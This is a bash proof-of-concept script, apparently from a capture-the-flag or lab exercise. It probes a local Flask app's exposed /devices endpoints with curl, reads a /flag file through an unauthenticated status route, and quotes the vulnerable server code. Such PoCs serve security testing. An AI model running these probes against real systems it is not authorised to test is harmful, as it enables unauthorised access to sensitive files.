#!/bin/bash

# POC: Exposed Internal Endpoints - Information Disclosure & SSRF
# Target: Flask application internal routes exposed to public
# Vulnerability: /devices/* endpoints accessible from external network

TARGET="http://localhost:32768"

echo "=== POC: Exposed Internal Endpoints - Information Disclosure ==="
echo ""
echo "Target: $TARGET"
echo ""

echo "[+] Step 1: Discover exposed internal endpoints"
echo "Accessing /devices endpoint (should be internal-only)..."
curl -s "$TARGET/devices" | head -30

echo ""
echo "[+] Step 2: Access sensitive flag information"
echo "Accessing /devices/flag/status endpoint..."
curl -s "$TARGET/devices/flag/status"

echo ""
echo "[+] Step 3: Test other device endpoints for information disclosure"
for device in "cpu_arm" "memory_ram" "storage_mmc" "bluetooth" "ethernet" "wifi_chipset"; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/devices/$device/status")
  echo "Device: $device - Status Code: $status"
done

echo ""
echo "[+] Step 4: Check for file access via the flag endpoint"
echo "The /devices/flag/status endpoint reads from /flag file:"
cat << 'CODE'

def get_flag_status():
    with open('/flag') as flag_file:
        flag_content = flag_file.read()
    response = f'''Checking flag value...
Flag: {flag_content}
...'''
    return Response(response, status=200, content_type='text/plain')

This function:
1. Reads /flag file from the filesystem
2. Includes it in the HTTP response
3. Returns it to any unauthenticated user
4. No authorization or authentication checks
CODE

echo ""
echo "=== VULNERABILITIES CONFIRMED ==="
echo "1. Internal-only device endpoints are exposed to public access"
echo "2. /devices/flag/status endpoint reads and exposes sensitive files"
echo "3. No authentication required to access internal information"
echo "4. Potential for SSRF if file path can be controlled"
echo "5. Information disclosure of system configuration and secrets"

